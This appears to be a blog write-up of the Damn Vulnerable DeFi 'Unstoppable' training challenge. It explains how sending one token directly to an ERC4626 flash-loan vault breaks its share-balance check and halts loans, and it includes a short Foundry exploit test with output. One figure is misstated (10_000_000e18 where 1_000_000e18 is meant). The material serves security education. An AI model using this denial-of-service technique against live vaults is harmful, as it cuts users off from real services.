<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://fouedsaidi.com/2025/12/10/damn-vulnerable-defi-v4-unstoppable/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewHello everyone! Hope you are doing fantastic! This is Foued SAIDI (0xkujen), senior pentester and a wannabe Web3&#x2F;Blockhain Security Researcher. Today I am launching the Damn Vulnerable De">
<meta property="og:type" content="article">
<meta property="og:title" content="Damn Vulnerable DeFi V4: Unstoppable">
<meta property="og:url" content="http://fouedsaidi.com/2025/12/10/Damn-Vulnerable-DeFi-V4-Unstoppable/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewHello everyone! Hope you are doing fantastic! This is Foued SAIDI (0xkujen), senior pentester and a wannabe Web3&#x2F;Blockhain Security Researcher. Today I am launching the Damn Vulnerable De">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://fouedsaidi.com/images/Blockchain/DVDeFi/Unstoppable/Unstoppable.png">
<meta property="article:published_time" content="2025-12-10T13:17:13.000Z">
<meta property="article:modified_time" content="2025-12-10T16:21:58.761Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fouedsaidi.com/images/Blockchain/DVDeFi/Unstoppable/Unstoppable.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Damn Vulnerable DeFi V4: Unstoppable -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI ðŸ‘‹","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Damn Vulnerable DeFi V4: Unstoppable</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-12-10 16:17:13</span>
        <span class="mobile">2025-12-10 16:17:13</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-12-10 19:21:58</span>
            <span class="mobile">2025-12-10 19:21:58</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Damn-Vulnerable-DeFi/">Damn Vulnerable DeFi</a>&nbsp;
                        </li>
                    
                    
                
                    
                        <li>
                            | <a href="/categories/Blockchain-Web3/">Blockchain/Web3</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>Hello everyone! Hope you are doing fantastic!</p>
<p>This is Foued SAIDI (0xkujen), senior pentester and a wannabe Web3&#x2F;Blockhain Security Researcher.</p>
<p>Today I am launching the <a class="link"   target="_blank" rel="noopener" href="https://www.damnvulnerabledefi.xyz/" >Damn Vulnerable DeFi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> series created by <a class="link"   target="_blank" rel="noopener" href="https://theredguild.org/" >The Red Guild <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> where I will be explaining in depth each challenge, my approach to solving it and my solutions.</p>
<p>Hope you enjoy it and learn something new!</p>
<h1 id="â€˜Unstoppableâ€™-challenge"><a href="#â€˜Unstoppableâ€™-challenge" class="headerlink" title="â€˜Unstoppableâ€™ challenge"></a>â€˜Unstoppableâ€™ challenge</h1><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Blockchain/DVDeFi/Unstoppable/Unstoppable.png"
                      alt="Unstoppable"
                ><figcaption>Unstoppable</figcaption></figure></p>
<h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><p>Thereâ€™s a tokenized vault with a million DVT tokens deposited. Itâ€™s offering flash loans for free, until the grace period ends.</p>
<p>To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. Thereâ€™s a monitoring contract to check liveness of the flashloan feature.</p>
<p>Starting with 10 DVT tokens in balance, show that itâ€™s possible to halt the vault. It must stop offering flash loans.</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.damnvulnerabledefi.xyz/challenges/unstoppable/" >Link to the original challenge <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/kujen5/Damn-Vulnerable-Defi-Solutions/tree/main/Unstoppable" >Github repo link that contains challenge code and solver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="Understanding-the-contracts"><a href="#Understanding-the-contracts" class="headerlink" title="Understanding the contracts"></a>Understanding the contracts</h1><h2 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h2><p>We have 3 main contracts</p>
<h3 id="DamnValuableToken-sol"><a href="#DamnValuableToken-sol" class="headerlink" title="DamnValuableToken.sol"></a>DamnValuableToken.sol</h3><p>This is the definition contract of the Damn Valuable Token (DVT): an <a class="link"   target="_blank" rel="noopener" href="https://ethereum.org/developers/docs/standards/tokens/erc-20/" >ERC20() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> token that will be the currency (token) in this project.</p>
<p>We can see that this token has 18 decimals </p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract <span class="title class_">DamnValuableToken</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC20</span>(<span class="string">&quot;DamnValuableToken&quot;</span>, <span class="string">&quot;DVT&quot;</span>, <span class="number">18</span>) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, <span class="title function_">type</span>(uint256).<span class="property">max</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="UnstoppableVault-sol"><a href="#UnstoppableVault-sol" class="headerlink" title="UnstoppableVault.sol"></a>UnstoppableVault.sol</h3><p>This will be the <a class="link"   target="_blank" rel="noopener" href="https://ethereum.org/developers/docs/standards/tokens/erc-4626" >ERC4626 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> vault tha will be managing <a class="link"   target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-3156" >flash loans <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> flash loans through the <code>UnstoppableVault::flashLoan()</code> function:</p>
<ol>
<li>Check if the amount is valid:</li>
</ol>
<p><code>if (amount == 0) revert InvalidAmount(0);</code></p>
<ol start="2">
<li>Check if the token is valid:</li>
</ol>
<p><code>if (address(asset) != _token) revert UnsupportedCurrency();</code></p>
<ol start="3">
<li>Check if the total shares (number of shares to release in place of assets) is equal to the total assets before:</li>
</ol>
<p><code>if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code></p>
<ol start="4">
<li>Execute flash loan logic from transferring the assets and making sure proper fees are applied through the <code>UnstoppableVault::flashFee()</code> function.</li>
</ol>
<p>The <code>UnstoppableVault.sol</code> contract has other functions but for the sake of this challenge we will not be explaining all of them. <code>UnstoppableVault::flashLoan()</code> is the most important one.</p>
<h3 id="UnstoppableMonitor-sol"><a href="#UnstoppableMonitor-sol" class="headerlink" title="UnstoppableMonitor.sol"></a>UnstoppableMonitor.sol</h3><p>This is the IERC3156 contract that will be used to monitor the flash loaning feature of the <code>UnstoppableVault</code> contract through functions such as:</p>
<ol>
<li><p><code>UnstoppableVault::onFlashLoan()</code> which is required by the IERC3156 standard and called after a flash-loan request to validate loan parameters, approve payments, etc. </p>
</li>
<li><p><code>UnstoppableVault::checkFlashLoan()</code> which checks if the vault can still perform flash loans in a correct way by ensuring the amount is higher than 0, tries to perform a flash loan and sees if it executes correctly.</p>
</li>
</ol>
<h2 id="Point-of-Failure"><a href="#Point-of-Failure" class="headerlink" title="Point of Failure"></a>Point of Failure</h2><p>At first, this contracts looks good. The objective of this challenge as per the description is to try and make the vault <code>stop offering flash loans</code>. </p>
<p>Stopping a smart contract from performing a normal behaviour is normally due to Denial of Service (DoS) attacks. You can read more about it with a few example on <a class="link"   target="_blank" rel="noopener" href="https://github.com/kujen5/Smart_Contract_Attacks/tree/main/SC10_Denial-of-Service-(DoS)-Attacks" >my github repo for Smart Contract Attacks related to OWASP SC10: Denial of Service (DoS) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<p>Usually, DoS exploits occur on the level of assertions and checks inside functions that try to make sure no unintended behaviour is occuring when calling the function.</p>
<p>Looking at the <a href="#UnstoppableVault.sol">UnstoppableVault </a> contract, we explained w few assertion on top of the <code>UnstoppableVault::flashLoan()</code>. One important check is to see if the total shares (number of shares to release in place of assets) is equal to the total assets before:</p>
<p><code>if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code></p>
<p>This could represent a huge issue for us, for a couple of reasons:</p>
<ol>
<li><p>This check is happening on the most important function of the contract which grants the flash loans.</p>
</li>
<li><p>This can be an issue if the contract somehow receives more tokens that it initially had, then does the comparison to what it initially had. That would break the check and would deny the contract from allowing the usage of that logic.</p>
</li>
</ol>
<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Our main goal is to deny the contract from allowing flash loans. We can do so by sending 1 DVT token (or even <code>1 wei</code>) to the vault. That would result in the total assets actually held by the vault being more than the shares of total supply that exists.</p>
<p>In a more technical way, letâ€™s assume the vault hold <code>1 Million DVT tokens</code> (as in the challenge scenario).</p>
<p>The <code>totalSupply()</code> would be <code>1_000_000e18</code>.<br>The <code>totalAssets()</code> would be <code>10_000_000e18</code>.</p>
<p>After a random user sends <code>1 DVT token</code> the values would be as follows:</p>
<p>The <code>totalSupply()</code> would <strong>STILL</strong> be <code>1_000_000e18</code>.<br>The <code>totalAssets()</code> would <strong>BECOME</strong> <code>1_000_001e18</code>.</p>
<p>That way, the assertion happening inside the <code>UnstoppableVault::flashLoan()</code> :</p>
<p><code>if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code> </p>
<p>Would be:</p>
<p><code>if (convertToShares(1_000_000e18) != 1_000_001e18) revert InvalidBalance();</code> </p>
<p>Which will fail and return <code>InvalidBalance()</code> </p>
<p>That way, we deny the vault from providing flash loans.</p>
<h2 id="Exploit-test-case"><a href="#Exploit-test-case" class="headerlink" title="Exploit test case"></a>Exploit test case</h2><p>The test case would be very simple, a direct <code>1 DVT</code> transfer:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test_unstoppable</span>(<span class="params"></span>) public checkSolvedByPlayer &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Vault balance before transfer: &quot;</span>,vault.<span class="title function_">totalAssets</span>());</span><br><span class="line">        token.<span class="title function_">transfer</span>(<span class="title function_">address</span>(vault), <span class="number">1e18</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Vault balance after transfer: &quot;</span>,vault.<span class="title function_">totalAssets</span>());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>The output would be:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ forge test -vv</span><br><span class="line">[â Š] <span class="title class_">Compiling</span>...</span><br><span class="line">[â ‘] <span class="title class_">Compiling</span> <span class="number">1</span> files <span class="keyword">with</span> <span class="title class_">Solc</span> <span class="number">0.8</span><span class="number">.25</span></span><br><span class="line">[â ˜] <span class="title class_">Solc</span> <span class="number">0.8</span><span class="number">.25</span> finished <span class="keyword">in</span> <span class="number">598.</span>47ms</span><br><span class="line"><span class="title class_">Compiler</span> run successful!</span><br><span class="line"></span><br><span class="line"><span class="title class_">Ran</span> <span class="number">2</span> tests <span class="keyword">for</span> test/<span class="title class_">Unstoppable</span>.<span class="property">t</span>.<span class="property">sol</span>:<span class="title class_">UnstoppableChallenge</span></span><br><span class="line">[<span class="variable constant_">PASS</span>] <span class="title function_">test_assertInitialState</span>() (<span class="attr">gas</span>: <span class="number">63383</span>)</span><br><span class="line">[<span class="variable constant_">PASS</span>] <span class="title function_">test_unstoppable</span>() (<span class="attr">gas</span>: <span class="number">82388</span>)</span><br><span class="line"><span class="title class_">Logs</span>:</span><br><span class="line">  <span class="title class_">Vault</span> balance before <span class="attr">transfer</span>:  <span class="number">1000000000000000000000000</span></span><br><span class="line">  <span class="title class_">Vault</span> balance after <span class="attr">transfer</span>:  <span class="number">1000001000000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Suite</span> <span class="attr">result</span>: ok. <span class="number">2</span> passed; <span class="number">0</span> failed; <span class="number">0</span> skipped; finished <span class="keyword">in</span> <span class="number">12.</span>02ms (<span class="number">1.</span>86ms <span class="variable constant_">CPU</span> time)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Ran</span> <span class="number">1</span> test suite <span class="keyword">in</span> <span class="number">104.</span>77ms (<span class="number">12.</span>02ms <span class="variable constant_">CPU</span> time): <span class="number">2</span> tests passed, <span class="number">0</span> failed, <span class="number">0</span> skipped (<span class="number">2</span> total tests)</span><br></pre></td></tr></table></figure></div>

<p>And that way, both our tests pass and the <code>checkSolvedByPlayer()</code>  modifier that runs the <code>_isSolved()</code> function goes through. Marking the successful solve of the challenge.</p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>That was it for <code>Unstoppable</code> challenge from <code>Damn Vulnerable DeFi</code> series.</p>
<p>You can find through <a class="link"   target="_blank" rel="noopener" href="https://github.com/kujen5/Damn-Vulnerable-Defi-Solutions/tree/main/Unstoppable" >this github link the repository that contains my solver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and all the future Damn Vulnerable DeFi solutions Inshallah!</p>
<p>See you next time~</p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Damn Vulnerable DeFi V4: Unstoppable</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2025-12-10 16:17:13</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-12-10 19:21:58
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2025/12/10/Damn-Vulnerable-DeFi-V4-Unstoppable/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/12/13/Hackthebox-WhiteRabbit/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: WhiteRabbit</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/12/06/Hackthebox-Editor/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Editor</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Damn Vulnerable DeFi V4: Unstoppable</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E2%80%98Unstoppable%E2%80%99-challenge"><span class="nav-text">â€˜Unstoppableâ€™ challenge</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenge-Description"><span class="nav-text">Challenge Description</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Understanding-the-contracts"><span class="nav-text">Understanding the contracts</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview-1"><span class="nav-text">Overview</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DamnValuableToken-sol"><span class="nav-text">DamnValuableToken.sol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UnstoppableVault-sol"><span class="nav-text">UnstoppableVault.sol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UnstoppableMonitor-sol"><span class="nav-text">UnstoppableMonitor.sol</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-of-Failure"><span class="nav-text">Point of Failure</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation"><span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-test-case"><span class="nav-text">Exploit test case</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-text">Conclusion</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
